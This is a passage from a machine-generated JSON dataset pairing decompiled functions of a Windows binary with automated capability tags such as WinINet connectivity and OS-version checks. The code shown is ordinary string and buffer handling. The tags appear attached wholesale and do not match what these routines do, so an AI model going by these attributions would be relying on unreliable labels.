(iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 471
    },
    "14007bbe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007bbe0(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    \n    if ((arg2 != 0) && (arg1 == NULL)) {\n        fcn.1400bd270(0x14010aae0);\n        return 0x1401083e0;\n    }\n    arg2 = arg2 - arg1;\n    piVar1 = fcn.14007c090(arg2, 0);\n    piVar2 = piVar1 + 3;\n    if (arg2 == 1) {\n        *(piVar1 + 3) = *arg1;\n    }\n    else if (arg2 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg2;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 238
    },
    "14007bd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007bd00(int64_t *arg1, int64_t arg2, int64_t arg3, uchar *arg4)\n\n{\n    int64_t *arg1_00;\n    int64_t arg2_00;\n    int64_t unaff_RBX;\n    char in_stack_00000028;\n    \n    arg2_00 = *arg1;\n    if ((arg3 + 0x3ffffffffffffff9) - *(arg2_00 + -0x18) < arg4) {\n        arg1_00 = 0x14010aa81;\n        fcn.1400bd360(0x14010aa81);\n        fcn.14007d8a0(arg1_00, arg2_00, arg3, unaff_RBX);\n        if (unaff_RBX != 0) {\n            if (unaff_RBX == 1) {\n                *(arg2_00 + *arg1_00) = *arg4;\n                return arg1_00;\n            }\n            sub.msvcrt.dll_memcpy(arg2_00 + *arg1_00, arg4, unaff_RBX);\n        }\n        return arg1_00;\n    }\n    fcn.14007d8a0(arg1, arg2, arg3, arg4);\n    if (arg4 != NULL) {\n        if (arg4 == 0x1) {\n            *(arg2 + *arg1) = in_stack_00000028;\n            return arg1;\n        }\n        sub.msvcrt.dll_memset(arg2 + *arg1, in_stack_00000028, arg4);\n    }\n    return arg1;\n}\n",
        "token_count": 362
    },
    "14007c02": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007c020(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    piVar1 = fcn.14007c090(*arg1 + arg3, arg1[1]);\n    iVar3 = *arg1;\n    piVar2 = piVar1 + 3;\n    if (iVar3 != 0) {\n        if (iVar3 == 1) {\n            *(piVar1 + 3) = *(arg1 + 3);\n            iVar3 = *arg1;\n        }\n        else {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1 + 3);\n            iVar3 = *arg1;\n        }\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar3;\n    *(piVar1 + iVar3 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 230
    },
    "14007c09": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14007c090(uint64_t arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t *arg1_00;\n    int64_t iVar2;\n    \n    if (arg1 < 0x3ffffffffffffffa) {\n        if (arg2 < arg1) {\n            if (arg1 < arg2 * 2) {\n                arg1 = arg2 * 2;\n            }\n            if (((0x1000 < arg1 + 0x39) && (arg2 < arg1)) &&\n               (arg1 = (arg1 + 0x1000) - (arg1 + 0x39 & 0xfff),  0x3ffffffffffffff9 < arg1)) {\n                arg1 = 0x3ffffffffffffff9;\n            }\n        }\n        iVar1 = fcn.1400bc710(arg1 + 0x19);\n        *(iVar1 + 8) = arg1;\n        *(iVar1 + 0x10) = 0;\n        return iVar1;\n    }\n    arg1_00 = 0x14010aa55;\n    fcn.1400bd360(0x14010aa55);\n    iVar1 = *arg1_00;\n    iVar2 = *(iVar1 + -0x18) + -1;\n    if ((*(iVar1 + -8) < 0) || (*(iVar1 + -0x18) == 0)) {\n        return iVar1 + iVar2;\n    }\n    if (**0x14010fc90 == 0) {\n        if (*(iVar1 + -8) < 1) goto code_r0x00014007c15d;\n    }\n    else if (*(iVar1 + -8) < 1) {\n        iVar1 = *arg1_00;\n        goto code_r0x00014007c15d;\n    }\n    fcn.14007d8a0(arg1_00, 0, 0, 0);\n    iVar1 = *arg1_00;\ncode_r0x00014007c15d:\n    *(iVar1 + -8) = 0xffffffff;\n    return iVar1 + iVar2;\n}\n",
        "token_count": 478
    },
    "14007d8a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14007d8a0(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t arg2_00;\n    uint64_t arg1_00;\n    int64_t iVar6;\n    \n    piVar1 = *0x14010fc90;\n    iVar4 = *arg1;\n    iVar5 = arg3 + arg2;\n    arg2_00 = *(iVar4 + -0x10);\n    arg1_00 = (arg4 - arg3) + *(iVar4 + -0x18);\n    iVar6 = *(iVar4 + -0x18) - iVar5;\n    if (arg1_00 <= arg2_00) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar4 + -8) < 1) {\ncode_r0x00014007d9c3:\n                if ((iVar6 != 0) && (arg4 != arg3)) {\n                    puVar2 = iVar4 + arg4 + arg2;\n                    if (iVar6 == 1) {\n                        *puVar2 = *(iVar4 + iVar5);\n                        iVar4 = *arg1;\n                    }\n                    else {\n                        sub.msvcrt.dll_memmove(puVar2, iVar4 + iVar5, iVar6);\n                        iVar4 = *arg1;\n                    }\n                }\n                goto code_r0x00014007d955;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                iVar4 = *arg1;\n                goto code_r0x00014007d9c3;\n            }\n            arg2_00 = *(*arg1 + -0x10);\n        }\n    }\n    iVar4 = fcn.14007c090(arg1_00, arg2_00);\n    if (arg2 == 0) {\ncode_r0x00014007d936:\n        if (iVar6 == 0) goto code_r0x00014007d93b;\ncode_r0x00014007d978:\n        puVar2 = iVar4 + arg2 + 0x18 + arg4;\n        if (iVar6 == 1) {\n            *puVar2 = *(iVar5 + *arg1);\n            goto code_r0x00014007d93b;\n        }\n        sub.msvcrt.dll_memcpy(puVar2, iVar5 + *arg1, iVar6);\n        iVar5 = *arg1;\n        if (*piVar1 != 0) goto code_r0x00014007d9a3;\ncode_r0x00014007d945:\n        iVar3 = *(iVar5 + -8);\n        *(iVar5 + -8) = iVar3 + -1;\n    }\n    else {\n        if (arg2 != 1) {\n            sub.msvcrt.dll_memcpy(iVar4 + 0x18, *arg1, arg2);\n            goto code_r0x00014007d936;\n        }\n        *(iVar4 + 0x18) = **arg1;\n        if (iVar6 != 0) goto code_r0x00014007d978;\ncode_r0x00014007d93b:\n        iVar5 = *arg1;\n        if (*piVar1 == 0) goto code_r0x00014007d945;\ncode_r0x00014007d9a3:\n        LOCK();\n        piVar1 = iVar5 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.1400bc6c0(iVar5 + -0x18);\n    }\n    iVar4 = iVar4 + 0x18;\n    *arg1 = iVar4;\ncode_r0x00014007d955:\n    *(iVar4 + -8) = 0;\n    *(iVar4 + -0x18) = arg1_00;\n    *(iVar4 + arg1_00) = 0;\n    return;\n}\n",
        "token_count": 922
    },
    "14007c48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007c480(int64_t *arg1, uchar *arg2, ulong *arg3)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    int64_t *arg1_00;\n    int64_t iVar5;\n    ulong *puVar6;\n    int64_t iVar7;\n    \n    if (arg3 == NULL) {\n        return arg1;\n    }\n    puVar4 = *arg1;\n    iVar7 = *(puVar4 + -0x18);\n    puVar6 = 0x3ffffffffffffff9 - iVar7;\n    if (puVar6 < arg3) {\n        arg1_00 = 0x14010ab0a;\n        fcn.1400bd360(0x14010ab0a);\n        puVar4 = *puVar6;\n        iVar7 = *(puVar4 + -0x18);\n        if (iVar7 == 0) {\n            return arg1_00;\n        }\n        iVar5 = *arg1_00;\n        iVar3 = *(iVar5 + -0x18);\n        uVar2 = iVar3 + iVar7;\n        if (uVar2 <= *(iVar5 + -0x10)) {\n            if (**0x14010fc90 == 0) {\n                if (*(iVar5 + -8) < 1) goto code_r0x00014007c5d0;\n            }\n            else if (*(iVar5 + -8) < 1) {\n                iVar5 = *arg1_00;\n                puVar4 = *puVar6;\n                iVar3 = *(iVar5 + -0x18);\n                goto code_r0x00014007c5d0;\n            }\n        }\n        fcn.14007d790(arg1_00, uVar2);\n        iVar5 = *arg1_00;\n        puVar4 = *puVar6;\n        iVar3 = *(iVar5 + -0x18);\ncode_r0x00014007c5d0:\n        if (iVar7 == 1) {\n            *(iVar5 + iVar3) = *puVar4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(iVar5 + iVar3, puVar4, iVar7);\n        }\n        iVar7 = *arg1_00;\n        *(iVar7 + -8) = 0;\n        *(iVar7 + -0x18) = uVar2;\n        *(iVar7 + uVar2) = 0;\n        return arg1_00;\n    }\n    uVar2 = arg3 + iVar7;\n    if (*(puVar4 + -0x10) < uVar2) {\ncode_r0x00014007c4c1:\n        if ((arg2 < puVar4) || (puVar4 + *(puVar4 + -0x18) < arg2)) {\n            fcn.14007d790(arg1, uVar2);\n            puVar4 = *arg1;\n            iVar7 = *(puVar4 + -0x18);\ncode_r0x00014007c4e4:\n            puVar4 = puVar4 + iVar7;\n            goto joined_r0x00014007c53f;\n        }\n        iVar7 = arg2 - puVar4;\n        fcn.14007d790(arg1, uVar2);\n        puVar4 = *arg1;\n        arg2 = puVar4 + iVar7;\n    }\n    else {\n        if (**0x14010fc90 == 0) {\n            if (0 < *(puVar4 + -8)) goto code_r0x00014007c4c1;\n            goto code_r0x00014007c4e4;\n        }\n        piVar1 = puVar4 + -8;\n        puVar4 = *arg1;\n        if (0 < *piVar1) goto code_r0x00014007c4c1;\n    }\n    puVar4 = puVar4 + *(puVar4 + -0x18);\njoined_r0x00014007c53f:\n    if (arg3 == 0x1) {\n        *puVar4 = *arg2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar4, arg2, arg3);\n    }\n    iVar7 = *arg1;\n    *(iVar7 + -8) = 0;\n    *(iVar7 + -0x18) = uVar2;\n    *(iVar7 + uVar2) = 0;\n    return arg1;\n}\n",
        "token_count": 999
    },
    "14007c59": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007c590(int64_t *arg1, ulong *arg2)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    \n    puVar4 = *arg2;\n    iVar1 = *(puVar4 + -0x18);\n    if (iVar1 == 0) {\n        return arg1;\n    }\n    iVar3 = *arg1;\n    iVar2 = *(iVar3 + -0x18);\n    arg2_00 = iVar2 + iVar1;\n    if (arg2_00 <= *(iVar3 + -0x10)) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar3 + -8) < 1) goto code_r0x00014007c5d0;\n        }\n        else if (*(iVar3 + -8) < 1) {\n            iVar3 = *arg1;\n            puVar4 = *arg2;\n            iVar2 = *(iVar3 + -0x18);\n            goto code_r0x00014007c5d0;\n        }\n    }\n    fcn.14007d790(arg1, arg2_00);\n    iVar3 = *arg1;\n    puVar4 = *arg2;\n    iVar2 = *(iVar3 + -0x18);\ncode_r0x00014007c5d0:\n    if (iVar1 == 1) {\n        *(iVar3 + iVar2) = *puVar4;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(iVar3 + iVar2, puVar4, iVar1);\n    }\n    iVar1 = *arg1;\n    *(iVar1 + -8) = 0;\n    *(iVar1 + -0x18) = arg2_00;\n    *(iVar1 + arg2_00) = 0;\n    return arg1;\n}\n",
        "token_count": 425
    },
    "14007c74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007c740(int64_t *arg1, int64_t *arg2, ulong arg3)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    \n    if (arg2 == NULL) {\n        return arg1;\n    }\n    iVar2 = *arg1;\n    iVar1 = *(iVar2 + -0x18);\n    piVar4 = 0x3ffffffffffffff9 - iVar1;\n    if (piVar4 < arg2) {\n        piVar3 = 0x14010ab0a;\n        fcn.1400bd360(0x14010ab0a);\n        iVar2 = *piVar3;\n        if (*(iVar2 + -8) < 0) {\n            *(iVar2 + -8) = 0;\n        }\n        iVar1 = *piVar4;\n        if (*(iVar1 + -8) < 0) {\n            *(iVar1 + -8) = 0;\n        }\n        *piVar3 = iVar1;\n        *piVar4 = iVar2;\n        return piVar3;\n    }\n    arg2_00 = arg2 + iVar1;\n    if (arg2_00 <= *(iVar2 + -0x10)) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar2 + -8) < 1) goto code_r0x00014007c7a5;\n        }\n        else if (*(iVar2 + -8) < 1) {\n            iVar2 = *arg1;\n            iVar1 = *(iVar2 + -0x18);\n            goto code_r0x00014007c7a5;\n        }\n    }\n    fcn.14007d790(arg1, arg2_00);\n    iVar2 = *arg1;\n    iVar1 = *(iVar2 + -0x18);\ncode_r0x00014007c7a5:\n    if (arg2 == 0x1) {\n        *(iVar2 + iVar1) = arg3;\n    }\n    else {\n        sub.msvcrt.dll_memset(iVar2 + iVar1, arg3, arg2);\n    }\n    iVar2 = *arg1;\n    *(iVar2 + -8) = 0;\n    *(iVar2 + -0x18) = arg2_00;\n    *(iVar2 + arg2_00) = 0;\n    return arg1;\n}\n",
        "token_count": 551
    },
    "14007c88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.14007c880(int64_t **arg1, int64_t **arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int32_t *piVar4;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    uchar auStack81 [9];\n    int64_t *piStack72;\n    int64_t **ppiStack64;\n    \n    ppiVar6 = *arg1;\n    piVar5 = ppiVar6[-3];\n    if (0x3ffffffffffffff9 < arg3) {\n        ppiVar6 = 0x14010aab4;\n        ppiStack64 = 0x14007c9c9;\n        fcn.1400bd360(0x14010aab4);\n        piVar4 = *0x14010fc90;\n        piVar5 = *arg2;\n        if (*ppiVar6 != piVar5) {\n            piStack72 = arg3;\n            ppiStack64 = arg1;\n            if (*(piVar5 + -1) < 0) {\n                piVar5 = fcn.14007c020(piVar5 + -3, &stack0xffffffffffffffaf, 0);\n                piVar3 = *ppiVar6;\n                iVar2 = **0x14010fc90;\n            }\n            else {\n                if (**0x14010fc90 == 0) {\n                    *(piVar5 + -1) = *(piVar5 + -1) + 1;\n                }\n                else {\n                    LOCK();\n                    *(piVar5 + -1) = *(piVar5 + -1) + 1;\n                }\n                iVar2 = *piVar4;\n                piVar3 = *ppiVar6;\n            }\n            if (iVar2 == 0) {\n                iVar2 = *(piVar3 + -1);\n                *(piVar3 + -1) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = piVar3 + -1;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                fcn.1400bc6c0(piVar3 + -3);\n            }\n            *ppiVar6 = piVar5;\n            return ppiVar6;\n        }\n        return ppiVar6;\n    }\n    if ((arg2 < ppiVar6) || (ppiVar6 + piVar5 < arg2)) {\ncode_r0x00014007c938:\n        ppiStack64 = 0x14007c945;\n        fcn.14007d8a0(arg1, 0, piVar5, arg3);\n        if (arg3 == NULL) {\n            return arg1;\n        }\n        if (arg3 == 0x1) {\n            **arg1 = *arg2;\n            return arg1;\n        }\n        ppiStack64 = 0x14007c95e;\n        sub.msvcrt.dll_memcpy(*arg1, arg2, arg3);\n        return arg1;\n    }\n    if (**0x14010fc90 == 0) {\n        if (0 < *(ppiVar6 + -1)) goto code_r0x00014007c938;\n    }\n    else {\n        if (0 < *(ppiVar6 + -1)) {\n            piVar5 = (*arg1)[-3];\n            goto code_r0x00014007c938;\n        }\n        ppiVar6 = *arg1;\n    }\n    if (arg2 - ppiVar6 < arg3) {\n        if (arg2 == ppiVar6) goto code_r0x00014007c900;\n        if (arg3 != 0x1) {\n            ppiStack64 = 0x14007c8f9;\n            sub.msvcrt.dll_memmove(ppiVar6, arg2, arg3);\n            ppiVar6 = *arg1;\n            goto code_r0x00014007c900;\n        }\n    }\n    else if (arg3 != 0x1) {\n        if (arg3 != NULL) {\n            ppiStack64 = 0x14007c99a;\n            sub.msvcrt.dll_memcpy(ppiVar6, arg2, arg3);\n            ppiVar6 = *arg1;\n        }\n        goto code_r0x00014007c900;\n    }\n    *ppiVar6 = *arg2;\n    ppiVar6 = *arg1;\ncode_r0x00014007c900:\n    *(ppiVar6 + -1) = 0;\n    ppiVar6[-3] = arg3;\n    *(ppiVar6 + arg3) = 0;\n    return arg1;\n}\n",
        "token_count": 1059
    },
    "14007d04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007d040(int64_t *arg1, int64_t *arg2)\n\n{\n    uint32_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint8_t *puVar9;\n    uint64_t uVar10;\n    uint64_t arg1_00;\n    int64_t in_R8;\n    int64_t iVar11;\n    \n    piVar5 = *0x14010fc90;\n    piVar6 = *(*arg1 + -0x18);\n    if (0x3ffffffffffffff9 < arg2) {\n        puVar9 = 0x14010ab1f;\n        piVar6 = fcn.1400bd360(0x14010ab1f);\n        if (in_R8 == 1) {\n            uVar3 = *arg2;\n            *puVar9 = uVar3;\n            return uVar3;\n        }\n        if (in_R8 != 0) {\n    // WARNING: Could not recover jumptable at 0x00014001e560. Too many branches\n    // WARNING: Treating indirect jump as call\n            piVar6 = (*_sym.imp.msvcrt.dll_memcpy)();\n            return piVar6;\n        }\n        return piVar6;\n    }\n    if (piVar6 < arg2) {\n        arg2 = arg2 - piVar6;\n        if (arg2 == NULL) {\n            return arg1;\n        }\n        iVar7 = *arg1;\n        iVar11 = *(iVar7 + -0x18);\n        piVar6 = 0x3ffffffffffffff9 - iVar11;\n        if (piVar6 < arg2) {\n            piVar8 = 0x14010ab0a;\n            fcn.1400bd360(0x14010ab0a);\n            iVar7 = *piVar8;\n            if (*(iVar7 + -8) < 0) {\n                *(iVar7 + -8) = 0;\n            }\n            iVar11 = *piVar6;\n            if (*(iVar11 + -8) < 0) {\n                *(iVar11 + -8) = 0;\n            }\n            *piVar8 = iVar11;\n            *piVar6 = iVar7;\n            return piVar8;\n        }\n        uVar10 = arg2 + iVar11;\n        if (uVar10 <= *(iVar7 + -0x10)) {\n            if (**0x14010fc90 == 0) {\n                if (*(iVar7 + -8) < 1) goto code_r0x00014007c7a5;\n            }\n            else if (*(iVar7 + -8) < 1) {\n                iVar7 = *arg1;\n                iVar11 = *(iVar7 + -0x18);\n                goto code_r0x00014007c7a5;\n            }\n        }\n        fcn.14007d790(arg1, uVar10);\n        iVar7 = *arg1;\n        iVar11 = *(iVar7 + -0x18);\ncode_r0x00014007c7a5:\n        if (arg2 == 0x1) {\n            *(iVar7 + iVar11) = in_R8;\n        }\n        else {\n            sub.msvcrt.dll_memset(iVar7 + iVar11, in_R8, arg2);\n        }\n        iVar7 = *arg1;\n        *(iVar7 + -8) = 0;\n        *(iVar7 + -0x18) = uVar10;\n        *(iVar7 + uVar10) = 0;\n        return arg1;\n    }\n    if (piVar6 <= arg2) {\n        return piVar6;\n    }\n    piVar6 = piVar6 - arg2;\n    iVar7 = *arg1;\n    puVar9 = piVar6 + arg2;\n    uVar10 = *(iVar7 + -0x10);\n    arg1_00 = *(iVar7 + -0x18) - piVar6;\n    iVar11 = *(iVar7 + -0x18) - puVar9;\n    if (arg1_00 <= uVar10) {\n        if (**0x14010fc90 == 0) {\n            piVar8 = piVar6;\n            if (*(iVar7 + -8) < 1) {\ncode_r0x00014007d9c3:\n                if ((iVar11 != 0) && (piVar6 != NULL)) {\n                    if (iVar11 == 1) {\n                        uVar3 = puVar9[iVar7];\n                        piVar8 = uVar3;\n                        *(iVar7 + arg2) = uVar3;\n                        iVar7 = *arg1;\n                    }\n                    else {\n                        piVar8 = sub.msvcrt.dll_memmove(iVar7 + arg2, puVar9 + iVar7, iVar11);\n                        iVar7 = *arg1;\n                    }\n                }\n                goto code_r0x00014007d955;\n            }\n        }\n        else {\n            piVar8 = *(iVar7 + -8);\n            if (*(iVar7 + -8) < 1) {\n                iVar7 = *arg1;\n                goto code_r0x00014007d9c3;\n            }\n            uVar10 = *(*arg1 + -0x10);\n        }\n    }\n    iVar7 = fcn.14007c090(arg1_00, uVar10);\n    if (arg2 == NULL) {\ncode_r0x00014007d936:\n        if (iVar11 == 0) goto code_r0x00014007d93b;\ncode_r0x00014007d978:\n        puVar2 = arg2 + iVar7 + 0x18;\n        if (iVar11 == 1) {\n            *puVar2 = puVar9[*arg1];\n            goto code_r0x00014007d93b;\n        }\n        sub.msvcrt.dll_memcpy(puVar2, puVar9 + *arg1, iVar11);\n        iVar11 = *arg1;\n        if (*piVar5 == 0) goto code_r0x00014007d945;\ncode_r0x00014007d9a3:\n        LOCK();\n        puVar1 = iVar11 + -8;\n        uVar4 = *puVar1;\n        *puVar1 = *puVar1 - 1;\n    }\n    else {\n        if (arg2 != 0x1) {\n            sub.msvcrt.dll_memcpy(iVar7 + 0x18, *arg1, arg2);\n            goto code_r0x00014007d936;\n        }\n        *(iVar7 + 0x18) = **arg1;\n        if (iVar11 != 0) goto code_r0x00014007d978;\ncode_r0x00014007d93b:\n        iVar11 = *arg1;\n        if (*piVar5 != 0) goto code_r0x00014007d9a3;\ncode_r0x00014007d945:\n        uVar4 = *(iVar11 + -8);\n        *(iVar11 + -8) = uVar4 - 1;\n    }\n    piVar8 = uVar4;\n    if (uVar4 < 1) {\n        piVar8 = fcn.1400bc6c0(iVar11 + -0x18);\n    }\n    iVar7 = iVar7 + 0x18;\n    *arg1 = iVar7;\ncode_r0x00014007d955:\n    *(iVar7 + -8) = 0;\n    *(iVar7 + -0x18) = arg1_00;\n    *(iVar7 + arg1_00) = 0;\n    return piVar8;\n}\n",
        "token_count": 1714
    },
    "14007d0e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14007d0e0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    if ((*(iVar1 + -8) < 0) || (*(iVar1 + -0x18) == 0)) {\n        return;\n    }\n    if (**0x14010fc90 == 0) {\n        if (*(iVar1 + -8) < 1) goto code_r0x00014007d115;\n    }\n    else if (*(iVar1 + -8) < 1) {\n        iVar1 = *arg1;\n        goto code_r0x00014007d115;\n    }\n    fcn.14007d8a0(arg1, 0, 0, 0);\n    iVar1 = *arg1;\ncode_r0x00014007d115:\n    *(iVar1 + -8) = 0xffffffff;\n    return;\n}\n",
        "token_count": 203
    },
    "14007d3a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
